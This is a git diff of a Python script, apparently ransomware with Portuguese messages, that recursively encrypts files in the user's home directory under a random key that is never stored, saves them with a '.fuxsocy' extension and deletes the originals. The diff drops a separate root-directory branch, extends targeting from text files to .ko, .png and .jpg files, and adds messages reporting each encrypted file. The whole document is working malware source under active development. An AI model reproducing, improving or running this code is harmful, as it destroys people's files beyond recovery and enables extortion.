@@ -14,7 +14,6 @@ from Crypto import Random
 
 
 USER_DIR = os.getenv('HOME')
-ROOT_PATH = '/root'
 
 
 def check_os(osname: str) -> str | None:
@@ -29,25 +28,14 @@ def check_os(osname: str) -> str | None:
     try:
         if (is_linux):
             if (sys.version[0] == '3'):
-                if (os.getuid() == 0):
-                    find_and_encrypt(
-                        path=ROOT_PATH,
-                        ext_files=['.txt'],
-                        hidden='.',
-                        new_ext='.fuxsocy',
-                        key=Random.get_random_bytes(32),
-                        block_bytes=65536
-                    )
-
-                else:
-                    find_and_encrypt(
-                        path=USER_DIR,
-                        ext_files=['.txt'],
-                        hidden='.',
-                        new_ext='.fuxsocy',
-                        key=Random.get_random_bytes(32),
-                        block_bytes=65536
-                    )
+                find_and_encrypt(
+                    path=USER_DIR,
+                    ext_files=['.txt', '.ko', '.png', '.jpg'],
+                    hidden='.',
+                    new_ext='.fuxsocy',
+                    key=Random.get_random_bytes(32),
+                    block_bytes=65536
+                )
             else:
                 sys.exit(
                     '\33[31mPython3 é requerido.\33[0m'
@@ -82,12 +70,12 @@ def find_and_encrypt(
                 )
             ]
 
-            if ((end_with_ext) and not (
+            if ((end_with_ext) and not(
                 file.startswith(
                     hidden
                 )
             )):
-                # # verificando permissão
+                # verificando permissão
                 if (
                     os.access(
                         os.path.join(
@@ -124,11 +112,15 @@ def find_and_encrypt(
                             )
 
                         with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
-                            f.write(
-                                cipher.encrypt(
-                                    data
+                            if (
+                                f.write(
+                                    cipher.encrypt(
+                                        data
+                                    )
                                 )
-                            )
+                            ):
+                                
+                                print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
 
                         os.remove(
                             os.path.join(
@@ -154,11 +146,15 @@ def find_and_encrypt(
                                 )
 
                             with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
-                                f.write(
-                                    cipher.encrypt(
-                                        data
+                                if (
+                                    f.write(
+                                        cipher.encrypt(
+                                            data
+                                        )
                                     )
-                                )
+                                ):
+                                    
+                                    print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')
 
                             os.remove(
                                 os.path.join(
@@ -183,14 +179,13 @@ def find_and_encrypt(
                                 ]
 
                                 with open('log_dimorf.log', mode='w') as lf:
-                                    lf.write(
-                                        logs
-                                    )
-
-            else:
-                sys.exit(
-                    '\33[31mNenhum arquivo encontrado.\33[0m'
-                )
+                                    if (
+                                        lf.write(
+                                            logs
+                                        )
+                                    ):
+                                        
+                                        print(f'\33[32mLogs gerado em {lf}\33[0m')
 
 
 if __name__ == '__main__':
